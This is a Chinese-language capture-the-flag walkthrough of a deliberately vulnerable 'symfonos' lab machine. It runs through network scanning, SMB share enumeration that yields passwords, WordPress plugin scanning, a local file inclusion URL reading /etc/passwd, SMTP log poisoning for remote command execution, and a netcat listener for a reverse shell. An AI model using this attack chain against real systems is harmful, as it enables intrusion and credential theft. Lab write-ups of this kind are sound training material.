### 1、通过arp-scan检测主机IP地址

```
arp-scan -l
```

![](../Images/1cbc2061fa094d0b2084e3d6dacdcef1.png)

### 2、通过nmap进行端口扫描

```
nmap -A -sS -sV -v -p- 192.168.1.9
```

**查看开放22、25、80、139、445端口**

![](../Images/b036a52fe2014e2cfcbbe9a656883acd.png)

### 3、WEB渗透测试

#### 3.1 查看服务器开启smb服务，先进行smb扫描探测

```
enum4linux 192.168.1.9
```

![](../Images/811c53e8709028a6f6ec0e985b1f4b8a.png)

**使用smbclient进行连接**

```
smbclient -H //192.168.1.9/anonymous
```

![](../Images/e4db6f95943d11dec9ee16fbc770df07.png)

**查看文件得到三个密码，epidioko、qwerty、baseball**

![](../Images/9918814bf406a69e049f686bd445f991.png)

#### 3.2 查看还有一个用户名的连接，使用qwerty密码连接成功

```


smbclient -H //192.168.1.9/helios  -U helios
```

![](../Images/6956215f33272f2979f3f48853e43d6b.png)

查看提示有一个/h3l105

![](../Images/b86c43f50d045f327847b9a98398ee82.png)

#### 3.3 访问该页面后，查看到是一个WordPress站点

![](../Images/30e702a8fb1cad6496a8efc67a5e3846.png)

#### 3.4 使用wpscan进行扫描，由于页面访问比较慢，需要添加hosts

```
vim /etc/hosts
```

![](../Images/5ea6eee21549daebb4d37c020136e4fc.png)

**使用wpscan进行扫描，查看到有两个漏洞的插件**

```
wpscan --url http://symfonos.local/h3l105/ -eap
```

![](../Images/3526a43d40cad85aafc8edd62d023520.png)

#### 3.5 漏洞检索，发现两个插件都有漏洞，但是SQL注入漏洞需要用户名和密码，LFI不需要用户名密码

```

searchsploit site editor 1.1.1
```

![](../Images/7c17fd63c7fa1af5f04e14c0891f7ffe.png)

#### 3.6 测试使用LFI读取/etc/passwd

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count\_of\_send.php?pl=/etc/passwd
```

![](../Images/224a9bab073fb39c267afff8cc33e2cf.png)

#### 3.7 使用SMTP日志投毒配合LFI来进行RCE

参考：https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/

```


telnet 192.168.1.9 25
```

![](../Images/710795c0f51783d8d4c3baca9fe7db75.png)

#### 3.8 测试访问 helios 邮件

```
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count\_of\_send.php?pl=/var/mail/helios&a=ip%20a
```

![](../Images/0631ac6cc94fb5c732e41fb844dd69bb.png)

#### 3.9 Kali开启NC反弹，并执行shell反弹

```
nc -nlvp 4444
```

![](../Images/51e49a6ebc2e8c534cec522ca86b6f41.png)

